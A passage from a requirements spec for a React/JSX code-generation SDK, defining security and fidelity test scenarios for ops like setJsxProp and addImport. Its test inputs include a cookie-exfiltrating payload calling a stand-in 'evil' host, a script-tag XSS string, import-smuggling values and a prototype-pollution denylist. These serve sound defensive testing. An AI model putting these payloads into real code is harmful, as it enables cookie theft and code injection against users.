wrong category for a strict-mode binding restriction, not a narrower version of the same
category. The requirement's "at minimum" floor language is retired for this set: the verifier's
exhaustive sweep proves 48/48 is complete for the BindingIdentifier-in-strict-ES-module problem
this argument validates.)

#### Scenario REQ-RXD-06.1: hostile expression as PROP NAME rejected pre-mutation (SEC-1)

- GIVEN `setJsxProp("Button", 'onError={fetch("//evil/"+cookie)}', "{x}")` — an injection
  payload in the propName position
- WHEN applied
- THEN it rejects via `dialectError` BEFORE any AST mutation — zero directives emitted, target
  file byte-unchanged (contrast REQ-RXD-12.1: the same payload as VALUE is emitted by contract)

#### Scenario REQ-RXD-06.2: real-world widened attribute names ACCEPTED byte-exact (SEC-2)

- GIVEN `setJsxProp` applied with propNames `data-testid`, `aria-label`, and `xlink:href`
  (each on its own single-match element)
- WHEN flushed
- THEN all three succeed and the printed output is byte-exact against a committed golden —
  the widened grammar admits hyphens and one colon segment

#### Scenario REQ-RXD-06.3: `addImport` name breakout rejected, zero imports (SEC-3)

- GIVEN `addImport('x } from "evil"; import { y', "react")` — a name attempting to close the
  clause and smuggle a second import
- WHEN applied
- THEN it rejects via `dialectError`; the printed file contains ZERO new import statements and
  is byte-unchanged

#### Scenario REQ-RXD-06.4: `from` escaping regression pin — hostile specifier stays ONE string (SEC-4)

- GIVEN `addImport("X", 'a"; import {y} from "evil')` — a module specifier attempting to
  terminate its own string literal
- WHEN flushed
- THEN the printed output contains exactly ONE import declaration whose module specifier is the
  full hostile string, ESCAPED as a single string literal — no `"evil"` module import exists in
  the output (pins the ts-morph escaping assumption this REQ rests on)

#### Scenario REQ-RXD-06.5: hostile-name battery — all rejected pre-mutation (NEW V2; denylist widened V4)

- GIVEN each of `__proto__`, `constructor`, `prototype` (the full prototype-walk denylist, V4),
  `"Foo bar"`, `"Foo=1}"`, `"a><script>alert(1)</script>"`, `""` (empty), `"   "`
  (whitespace-only), `"foo\nbar"`, `"123abc"` supplied as `elementName` and as `propName` (and,
  where the grammar applies, as `addImport.name`)
- WHEN each op is applied
- THEN every case rejects via `dialectError` pre-mutation — zero directives, file
  byte-unchanged; the three denylist names reject via the frozen-`Set` equality check even
  though each matches the grammar, and each such tail names the reserved-name rule (the fixed
  denylist literal MAY be echoed — it equals the rule's own vocabulary, ≤16 chars)

#### Scenario REQ-RXD-06.6: elementName grammar accepts member and hyphenated names (NEW, V2)

- GIVEN `setJsxProp("Menu.Item", "x", "{1}")` and `setJsxProp("my-web-component", "x", "{1}")`
  each against a `.tsx` file containing exactly one matching element
- WHEN applied
- THEN neither is rejected by the name validator — both proceed to targeting (REQ-RXD-04)

#### Scenario REQ-RXD-06.7: `addImport.name` reserved-word battery rejected pre-mutation (NEW, V5 — SEC-1)

- GIVEN each of `default`, `import`, `class`, `null`, `this`, `function`, `let`, `yield`,
  `await` supplied as `addImport.name`
- WHEN `addImport` is applied
- THEN every case rejects via `dialectError` BEFORE any AST mutation — zero directives, file
  byte-unchanged, tail names `name` and the reserved-word rule; AND an identifier that merely
  CONTAINS a reserved word as a substring (`classroom`, `imported`, `defaultValue`) is ACCEPTED
  — the check is exact Set membership, never a substring or prefix match

#### Scenario REQ-RXD-06.8: Set-key-safety — propName/elementName never used as object keys (NEW, V5 — SEC-2)

- GIVEN the validator module (`src/core/jsx-name-validator.ts`) and the react ops
  implementation (`src/dialects/react/ops.ts`)
- WHEN statically scanned for `propName`/`elementName` used as a plain-object key (`obj[name]`,
  `{[name]: …}`, `counts[tag]++`, or equivalent)
- THEN zero matches — all targeting and validation use `===`/`Set`/`Map` equality only; this
  property, not denylist width, is the requirement's actual defence against SDK-internal
  prototype pollution

#### Scenario REQ-RXD-06.9: `addImport.name` strict-mode-restricted identifiers rejected pre-mutation (NEW, V6 — F-1)

- GIVEN `eval` supplied as `addImport.name` (`addImport("eval", "react")`) and, separately,
  `arguments` supplied as `addImport.name` (`addImport("arguments", "react")`) — each its own
  isolated application
- WHEN `addImport` is applied
- THEN both reject via `dialectError` BEFORE any AST mutation — zero directives emitted, target
  file byte-unchanged, tail names `name` and the reserved-word rule; AND identifiers that merely
  CONTAIN one of these two names as a substring (`evaluate`, `myEval`, `argumentsList`) supplied
  as `addImport.name` are ACCEPTED — same exact-Set-membership discipline as REQ-RXD-06.7, now
  exercised against the full 48-entry `IMPORT_RESERVED_WORDS` set

### REQ-RXD-07: Coalescing — heterogeneous-region proof

A chain `find(path).setJsxProp(...).addImport(...)` (or the reverse order) on ONE handle MUST
coalesce into EXACTLY ONE `modify` directive whose content reflects BOTH mutations — the
import-declaration region AND the JSX-attribute region — proving the ADR-0006/ADR-0037
one-live-AST seam across heterogeneous AST regions, a strictly stronger proof than two ops
mutating the same subtree.

#### Scenario REQ-RXD-07.1: two heterogeneous ops, one modify

- GIVEN `find(path).setJsxProp("Button", "onClick", "{handleClick}").addImport("handleClick",
  "./handlers")` — mutating a JSX attribute AND an import declaration on one handle
- WHEN flushed
- THEN exactly ONE `modify` directive is emitted, AND its content shows BOTH the imported
  symbol AND the JSX attribute wired in, byte-exact against a committed golden fixture

### REQ-RXD-08: Conformance — byte-exact gate over the JSX adversarial corpus (required capability)

`testDialect`/`testOpPack` MUST run green against the six kit-mandatory adversarial samples
PLUS a ~20-sample JSX-specific adversarial corpus whose MIX (not merely count) covers, at
minimum: fragments; self-closing tags; spread props; namespaced attributes; entities;
comments-inside-JSX as an explicit `{/* x */}` sample; conditional and ternary rendering
(`{cond && <X/>}`, `{cond ? <A/> : <B/>}`); parenthesised JSX return
(`return (\n  <div/>\n)`); JSX-lookalike strings that must NOT be JSX-ified (a template
literal containing `<div>${x}</div>`; `<p>{"<script>"}</p>`); whitespace fidelity (`<br />`
vs `<br/>` — the pre-`/>` space survives); TSX-distinctive parse forms (`const id = <T,>(a: T)
=> a;`); `<Menu.Item/>`; a multi-line-attribute element; CRLF+JSX; BOM+JSX; and a 4 MiB TSX
sample. This corpus is a REQUIRED capability of this change, not an optional nice-to-have —
the kit's own 6 mandatory samples are JSX-blind and do not exercise this dialect's actual
syntax surface.

(Previously: V1 enumerated a smaller mix. V2 re-specifies the corpus mix per council — mix
beats count; the TSX-distinctive and JSX-lookalike classes are the highest-value additions.)

#### Scenario REQ-RXD-08.1: corpus green through `testDialect`

- GIVEN the JSX adversarial corpus (every class enumerated above) plus the 6 kit-mandatory
  samples
- WHEN run through `testDialect` against the React dialect
- THEN every sample round-trips byte-exact

#### Scenario REQ-RXD-08.2: `setJsxProp` op-pack fidelity proven under real mutation

- GIVEN the JSX adversarial corpus exercised via `testOpPack` with `setJsxProp` chains,
  including the `<Menu.Item/>` sample and the multi-line-attribute element as INSERTION targets
- WHEN run
- THEN each exercise's coalesced `modify` content is byte-exact against its fixture `expect`
  value — proving `setJsxProp`'s `JsxAttribute` set/add fidelity across the corpus under a
  REAL mutation, not merely idle round-trip (spike-gate obligation: Open Flags for Design)

### REQ-RXD-09: Author-facing docs — second worked example, trust posture, honest limitations

`docs/authoring-a-dialect.md` MUST gain a second worked example for `@pbuilder/sdk/react`
meeting ALL of these criteria:

- the worked example is the COALESCED author journey — `addImport` + `setJsxProp` on one
  handle — with the byte output shown via `// ->` comments (matching the doc's existing
  worked-example convention), not an isolated single-op snippet;
- author-facing prose states the v1 2-op minimality, NAMES the React op-catalog follow-up plan
  as where additional ops land, and shows `.modify(fn)` as the interim escape hatch;
- the `value` trust boundary (REQ-RXD-12's wording) appears in the doc — authors are told
  `value` becomes executable code and untrusted input is their responsibility to sanitise;
- the named-only `addImport` limitation (REQ-RXD-05) is documented, with default/mixed imports
  named as catalog-follow-up scope;
- the spread-precedence behaviour (REQ-RXD-10.2 — an inserted explicit prop lands AFTER a
  trailing `{...spread}` and therefore wins at React runtime) carries an explicit doc warning;
- per-op JSDoc on the shipped `setJsxProp`/`addImport` documents each op's idempotency and
  rejection rule at the same fidelity the TypeScript dialect's `addImport`/`removeImport`
  JSDoc already sets;
- the doc's now-stale "the first real dialect … five structured ops" framing is RECONCILED —
  the doc must not describe the TypeScript dialect as the only dialect once `./react` ships;
- (V4) the explicit-extension requirement (REQ-RXD-02 — always pass the `.tsx` extension;
  extensionless paths are rejected) is documented author-facing: in `find`'s JSDoc AND as a
  worked-example note, INCLUDING the why — extensionless paths are rejected to stay
  forward-compatible with future `.jsx` support.

(Previously: V1 required minimality + catalog + `.modify()` framing only. V2 adds the trust
boundary, named-only limitation, spread warning, `// ->` worked-example form, JSDoc-fidelity
criterion, and the stale-framing reconciliation. V3 briefly added an extensionless-convenience
documentation criterion; V4 replaces it in place with the explicit-extension requirement
documentation, tracking REQ-RXD-02's V4 reversal.)

#### Scenario REQ-RXD-09.1: doc names the shipped ops, minimality, catalog, and escape hatch

- GIVEN `docs/authoring-a-dialect.md` after this change
- WHEN scanned
- THEN it documents `@pbuilder/sdk/react`'s exactly two ops, states the v1 minimality, names
  the React op-catalog follow-up, and shows `.modify(fn)` as the escape hatch

#### Scenario REQ-RXD-09.2: worked example is the coalesced journey with `// ->` output

- GIVEN the doc's React worked example
- WHEN read
- THEN it chains `addImport` + `setJsxProp` on ONE handle and shows the resulting byte output
  via `// ->` comments

#### Scenario REQ-RXD-09.3: trust-boundary and spread warnings present, guard-asserted

- GIVEN the doc's `setJsxProp` coverage
- WHEN a guard test scans it (mirrors the REQ-DAS-01.2 two-realms guard pattern)
- THEN a `value`-trust section is present (untrusted input = author's responsibility) AND the
  spread-precedence warning is present — the guard fails RED if either section is removed

#### Scenario REQ-RXD-09.4: stale single-dialect framing reconciled (NEW, V2)

- GIVEN the doc after this change
- WHEN scanned for the pre-existing "first real dialect … five structured ops" framing
- THEN that framing is updated to acknowledge two dialects — no sentence describes
  `./typescript` as the only shipped dialect

#### Scenario REQ-RXD-09.5: explicit-extension requirement documented in find JSDoc and worked example (minted V3; content replaced V4)

- GIVEN the shipped `find`'s JSDoc and the doc's React worked-example section
- WHEN scanned
- THEN both state the explicit-`.tsx`-extension requirement — extensionless paths are rejected
  (REQ-RXD-02) — and name the forward-compatibility reason (future `.jsx` support), so authors
  learn the rule and the why without reading the spec

### REQ-RXD-10: `setJsxProp` placement and whitespace contract (NEW, V2)

An INSERTED attribute MUST be appended AFTER the last existing attribute (including after a
`{...spread}` when the spread is last), separated by a single space, with NO reflow of the
element or the rest of the file. Insertion after a trailing spread is deliberate semantics, not
an accident: the explicit prop landing after the spread means it WINS at React runtime
(later-position precedence) — the deterministic, author-favouring outcome. An UPDATED attribute
MUST have its initializer replaced IN PLACE — attribute position within the element preserved.
The element's closing form MUST be preserved: a self-closing element stays self-closing, a
paired-tag element stays paired. All placement scenarios are pinned by byte-exact goldens.

#### Scenario REQ-RXD-10.1: append-after-last, single space, no reflow

- GIVEN `<Button type="submit" className={cls} />` (one match)
- WHEN `setJsxProp("Button", "disabled", "{isBusy}")` is applied
- THEN the new attribute appears immediately after `className={cls}` with a single-space
  separator, byte-exact against a committed golden — no attribute reordering, no reflow

#### Scenario REQ-RXD-10.2: insertion after a trailing spread — explicit prop wins (SEC-5)

- GIVEN `<Button {...rest} />` (one match)
- WHEN `setJsxProp("Button", "onClick", "{safe}")` is applied
- THEN the printed output is `<Button {...rest} onClick={safe} />` byte-exact — the explicit
  prop lands AFTER the spread and therefore takes precedence at React runtime (the REQ's stated
  rationale; the paired doc warning is REQ-RXD-09.3)

#### Scenario REQ-RXD-10.3: update replaces initializer in place

- GIVEN `<Button onClick={old} type="submit" />`
- WHEN `setJsxProp("Button", "onClick", "{fresh}")` is applied
- THEN `onClick` stays the FIRST attribute with its initializer replaced — position preserved,
  byte-exact golden

#### Scenario REQ-RXD-10.4: self-closing form preserved

- GIVEN a self-closing `<Input />` (one match)
- WHEN `setJsxProp("Input", "required")` is applied
- THEN the element remains self-closing in the printed output

#### Scenario REQ-RXD-10.5: paired-tag form preserved

- GIVEN a paired `<Button>Save</Button>` (one match)
- WHEN `setJsxProp("Button", "disabled")` is applied
- THEN the element remains paired with its children byte-identical

#### Scenario REQ-RXD-10.6: multi-line-attribute element insertion

- GIVEN an element whose existing attributes span multiple lines
- WHEN `setJsxProp` inserts a new attribute
- THEN the printed output is byte-exact against a committed golden — existing line structure
  undisturbed

### REQ-RXD-11: `setJsxProp` value grammar — verbatim initializer text, three forms (NEW, V2; wording corrected V5)

`value` is the VERBATIM initializer text — the author supplies the delimiters: a `value` of
`'"hi"'` produces `bar="hi"` (string form); `'{count}'` produces `bar={count}` (expression
container); an OMITTED/`undefined` `value` produces the boolean-shorthand attribute
(`disabled`, no `=`). The op does NOT SEMANTICALLY re-validate `value`: a value that is
syntactically malformed but DELIMITER-BALANCED enough for the underlying AST manipulation to
succeed (e.g. `'{1+}'` — an incomplete expression, braces balanced) is emitted AS-IS per the
trust contract (REQ-RXD-12) — the author owns output well-formedness for this argument. A
value whose delimiters are NOT balanced (e.g. a bare unterminated `'{'`) causes the underlying
manipulation itself to fail, because ts-morph reparses and reconciles the whole file after
each structural edit and an unterminated construct is a syntax error at that reparse — this
failure is CONTAINED the same way every other reject in this dialect is (REQ-RXD-13): zero
directives emitted, target file byte-unchanged. This is a mechanical consequence of ADR-03's
structured-API-only mutation path, not an SDK-authored semantic check on `value`.

(Previously: V2 introduced this requirement, stating a malformed value like `'{'` is "emitted
as-is". V5 corrects the wording: that specific literal example is unimplementable under
ADR-03 — ts-morph's structured API throws a `Manipulation error` on an unterminated `'{'`
before `print()` ever runs, so it is never "emitted". The requirement's real, provable
property — no SEMANTIC re-validation of `value` — is restated against a delimiter-balanced
example that actually round-trips, and the genuinely-unterminated case is pinned separately as
a SAFE failure, not silent corruption.)

#### Scenario REQ-RXD-11.1: string form

- GIVEN `setJsxProp("Input", "placeholder", '"Search…"')` (one match)
- WHEN flushed
- THEN the printed attribute is `placeholder="Search…"`, byte-exact golden

#### Scenario REQ-RXD-11.2: expression-container form

- GIVEN `setJsxProp("Input", "value", "{count}")`
- WHEN flushed
- THEN the printed attribute is `value={count}`, byte-exact golden

#### Scenario REQ-RXD-11.3: omitted value — boolean shorthand

- GIVEN `setJsxProp("Input", "required")` with no third argument
- WHEN flushed
- THEN the printed attribute is bare `required` — no `=`, no initializer

#### Scenario REQ-RXD-11.4: upsert across form change

- GIVEN `<Input value="static" />` and `setJsxProp("Input", "value", "{dynamic}")`
- WHEN flushed
- THEN the attribute reads `value={dynamic}` — string form replaced by expression container in
  place, byte-exact golden

#### Scenario REQ-RXD-11.5: delimiter-balanced malformed value emitted as-is (trust contract; example corrected V5)

- GIVEN `setJsxProp("Button", "data-x", "{1+}")` — a delimiter-balanced but semantically
  incomplete expression (`1+` is not a valid complete expression)
- WHEN flushed
- THEN `{1+}` is emitted verbatim into the attribute position — the op performs no SEMANTIC
  re-validation; responsibility sits with the author (REQ-RXD-12)

#### Scenario REQ-RXD-11.6: genuinely unterminated value fails safely, contained (NEW, V5)

- GIVEN `setJsxProp("Button", "data-x", "{")` — an unterminated initializer that breaks
  ts-morph's own reparse
- WHEN flushed
- THEN the op throws — contained the same way every other reject is: zero directives are
  emitted for the run and the target file is byte-unchanged; this is NOT a name-validator
  reject (no `dialectError` from REQ-RXD-06) but the manipulation's own failure, and it MUST
  NOT corrupt or partially write the target file

### REQ-RXD-12: Trust boundary — `value` is a trusted-code channel (NEW, V2, first-class)

`setJsxProp`'s `value` is emitted verbatim as the attribute's expression/string initializer.
The SDK performs no validation, escaping, or sanitisation on `value`; it becomes executable
code in the generated file. The author is solely responsible for ensuring `value` is not
derived from untrusted input (e.g. schema `options`, CLI answers, network data) without the
author's own sanitisation. This mirrors the existing `.modify(fn)` and `addFunction(source)`
latitude. By contrast, `elementName` and `propName` are validated name arguments and are NOT a
trusted-code channel. This trust split MUST appear in the shipped docs (REQ-RXD-09.3) and in
`setJsxProp`'s own JSDoc.

(Previously: V1 stated this inside REQ-RXD-06's body as a paragraph. V2 promotes it to a
first-class requirement with the council-ratified wording, and splits the conflated V1
injection scenario into REQ-RXD-06.1 — hostile propName REJECTED — and REQ-RXD-12.1 below —
hostile value EMITTED — two opposite assertions one checkbox previously blurred.)

#### Scenario REQ-RXD-12.1: hostile expression as VALUE is emitted verbatim by contract (SEC-8)

- GIVEN `setJsxProp("Button", "onError", '{fetch("//evil/"+cookie)}')` — the injection-shaped
  payload in the VALUE position
- WHEN flushed
- THEN it SUCCEEDS and the printed output contains the payload VERBATIM as `onError`'s
  initializer — pinning the contract side of the trust split (its rejection twin is
  REQ-RXD-06.1, same payload in the propName position)

### REQ-RXD-13: Rejection-surface hygiene — no-echo tails, zero-emit, byte-unchanged (NEW, V2)

EVERY rejection this dialect mints (name-validator rejects REQ-RXD-06, match-count rejects
REQ-RXD-04, extension-gate rejects REQ-RXD-02) MUST satisfy, jointly:

- **Zero-emit**: zero directives are emitted for the run and the target file's content is
  byte-unchanged — a validate-then-mutate-anyway mutant dies against this; throw-only
  assertions do not kill it.
- **No-echo tails (name validators)**: the `dialectError` tail names the offending ARGUMENT
  (e.g. `propName`) and the RULE it broke — it MUST NOT interpolate the rejected value
  unbounded. If a fragment of the value is included for diagnosis, it is capped at ≤16
  characters and appears nowhere else on the error surface (asymmetry precedent: key/argument
  NAMES may appear; VALUES never do). The full-echo pattern of the TypeScript dialect's
  `assertNoCollision` message MUST NOT be copied onto these rejection paths.
- **Bounded path echo (extension gate)**: REQ-RXD-02's messages MAY echo the offending path —
  paths are not payloads — bounded, consistent with existing dialect messages.

The canary harness `test/security/canary-no-echo.test.ts` (`surfaceContains`) is the
enforcement vehicle for the no-echo property.

#### Scenario REQ-RXD-13.1: canary payload never surfaces on the rejection path (SEC-7)

- GIVEN a name-validator reject triggered with a hostile value containing a unique canary
  string (≥24 chars, so no ≤16-char diagnostic fragment can contain it)
- WHEN the rejection error is captured and swept via `surfaceContains` (message, all own
  properties, `.cause`, stack)
- THEN the canary appears NOWHERE on the error surface

#### Scenario REQ-RXD-13.2: every reject path is zero-emit and byte-unchanged

- GIVEN one representative reject from EACH path — validator (REQ-RXD-06), zero-match and
  multi-match (REQ-RXD-04), extension gate (REQ-RXD-02, in-run form)
- WHEN each run settles
- THEN each emits ZERO directives and a subsequent read shows the target file byte-unchanged

#### Scenario REQ-RXD-13.3: tail names argument and rule, never the unbounded value

- GIVEN a propName validator reject with a 100-char hostile value
- WHEN the error message is inspected
- THEN it names `propName` and the grammar rule; the full 100-char value does NOT appear (any
  diagnostic fragment is ≤16 chars)

### REQ-RXD-14: Supply-chain gate — spike dependencies never ship (NEW, V2)

The exploration spike installed `@babel/parser`, `@babel/generator`, `recast`, and
`magic-string` in a scratchpad. NONE of these MAY appear in the shipped `package.json`
(dependencies, devDependencies, or any other field) or the committed lockfile. The package's
runtime `dependencies` MUST remain exactly `{ "ts-morph": <exact-pin> }` — this change adds
ZERO dependencies (FIT-14's baseline pin is the standing enforcement).

#### Scenario REQ-RXD-14.1: spike libraries absent from manifest and lockfile

- GIVEN the shipped `package.json` and committed lockfile after this change
- WHEN scanned for `@babel/parser`, `@babel/generator`, `recast`, `magic-string`
- THEN zero matches — and `dependencies` still equals exactly the single exact-pinned
  `ts-morph` entry

### REQ-RXD-15: Contributor docs — teach the `validatedOp` security pattern (NEW, V5)

`docs/authoring-a-dialect.md`'s "For contributors: building a dialect" section MUST document
the `validatedOp` pattern (`src/core/jsx-name-validator.ts`) as the RECOMMENDED practice for
any op that takes a name/identifier-shaped argument spliced into generated source: wrap the op
with `validatedOp(validators, body)` so mutation code is structurally unreachable before every
declared name argument validates, and register a per-argument grammar (plus a denylist, where
a prototype-pollution-shaped risk applies) rather than reusing a single shared regex. The doc
MUST name the concrete vulnerability class this pattern closes — raw, unescaped name/identifier
splicing by ts-morph's structured API (the same class ADR-05 calls "a confirmed vulnerability
class this op does not repeat") — so a third-party or future in-repo dialect author is not left
to rediscover it. This is a DOCUMENTATION requirement, not an enforcement mechanism: it does
not mandate a fitness function requiring `validatedOp` usage — that is a separate, larger
followup (registered at archive), out of this change's scope.

(NEW at V5 — council ARCH-1: the doc taught `defineDialect`/`defineOpPack`/`withOps` well but
said nothing about `validatedOp`, name validation, the denylist, or the no-echo tail; its only
validation-adjacent prose (the `value` trust-boundary text) teaches the OPPOSITE lesson — "we
don't validate this" — with no companion statement that name/identifier arguments ARE
validated and how. Left uncorrected, a third dialect's author following the doc as written
would reproduce the exact laxity this change was built to close.)

#### Scenario REQ-RXD-15.1: contributor section names validatedOp and the vulnerability class

- GIVEN `docs/authoring-a-dialect.md`'s "For contributors: building a dialect" section after
  this change
- WHEN scanned
- THEN it names `validatedOp`, describes the validate-before-mutate chokepoint pattern, and
  states the raw-splice vulnerability class it closes, with a pointer to
  `src/core/jsx-name-validator.ts` as the reference implementation

#### Scenario REQ-RXD-15.2: guard-asserted like REQ-RXD-09.3's pattern

- GIVEN a guard test scanning the contributor section (mirrors REQ-RXD-09.3's pinned-sentinel
  pattern)
- WHEN the `validatedOp` sentinel sentence is removed
- THEN the guard fails RED — the section cannot silently regress to omitting the pattern

## Sensitive Areas Coverage

| Area | REQ IDs | Flagged at triage? |
|---|---|---|
| security (code execution) — new `.modify()`-equivalent instance in a new AST realm, load-bearing name validators, trust boundary, rejection hygiene | REQ-RXD-01..07, REQ-RXD-10..13 | Yes |
| public-api (contract) — new `package.json#exports` subpath | REQ-RXD-01, REQ-RXD-02 | Yes (corroborating) |
| security (supply-chain) — spike-dependency gate | REQ-RXD-14 | Yes |
| security (contributor guidance) — teaches the `validatedOp` pattern so future dialects don't ship unvalidated ops | REQ-RXD-15 | Yes (derivative of code-execution area) |

## Open Flags for Design

- **`setJsxProp` fidelity + validator-load-bearing spike-gate (BLOCKING obligation, extended
  V2)**: before apply, design MUST run the de-risk spike (reusing the scratchpad harness)
  proving (a) `JsxAttribute` set/add byte-exactness across the corpus under real mutation
  (REQ-RXD-08.2), AND (b) empirically that an UNVALIDATED propName splices RAW into the
  printed source — demonstrating the validator is load-bearing, not assumed
  belt-and-suspenders (council ruling on ts-morph's raw-text structure writes).
- **Duplicate-vs-shared ops / fidelity-glue hoist**: unchanged from V1 — ops axis duplicate;
  fidelity-glue primitives lean hoist to `src/core/**`, fallback duplicate+followup.
  `architecture_impact` posture handed to design (`modifying` under hoist; `additive` under
  fallback).
- **Spread-supplied prop collision**: REQ-RXD-04/10 pin attribute-list matching and
  after-spread insertion; whether a `{...spread}` might already supply `propName` is
  unknowable statically — v1's contract is positional precedence (REQ-RXD-10.2) + doc warning
  (REQ-RXD-09.3), not detection. Design owns any diagnostic beyond that.
- **Validator module home**: REQ-RXD-06 pins behaviour (grammars, per-arg application,
  pre-mutation timing, denylist), never the module's file path. Design owns placement
  (core-resident per proposal's intent).

## Notes for sdd-archive (followup ledger additions — join the proposal's Archive Commitments)

- **TS-dialect trust-boundary JSDoc backfill**: the shipped TypeScript dialect's splice-arg ops
  (`addFunction`/`addVariable`/`addClass` `source`/`initializer` args) carry no trust note in
  their JSDoc — backfill REQ-RXD-12-equivalent wording (security council finding; distinct from
  pending item 22's validator retrofit).
- **Default/mixed-import support**: named-only limitation (REQ-RXD-05.4) → React op-catalog
  follow-up is its home.
- **`.jsx` extension support — ALREADY REGISTERED in `openspec/pending-changes.md`**
  (owner-requested, added mid-plan 2026-07-16, before build). Do NOT register a second row;
  when the React op-catalog groups are created at archive, fold the existing `.jsx` row into
  the catalog plan or re-affirm it standalone — never duplicate, never orphan.
- **`dialect-handle.ts`'s hardcoded "as TypeScript" parse-failure message** (council DOC-3,
  `src/core/dialect-handle.ts:178`): pre-existing and correct when one dialect existed; THIS
  change is the event that exposes it as wrong (a `.tsx` parse failure is now reported "as
  TypeScript", discarding the dialect's own diagnostic). NOT spec'd in this change: the file is
  explicitly Read-only/zero-change in this change's signed design §4.2, and a correct fix needs
  a per-dialect display name threaded through the generic `dialect-handle`/`define-dialect`
  seam shared by EVERY dialect — an engine-layer change this change's triage scope explicitly
  excludes ("Any change to the engine or wire protocol"). Register as a pending-change at
  archive. `test/core/dialect-handle.test.ts:328` currently PINS the wrong text
  (`'could not parse "a.toy" as TypeScript'`) and will need updating alongside the eventual fix.
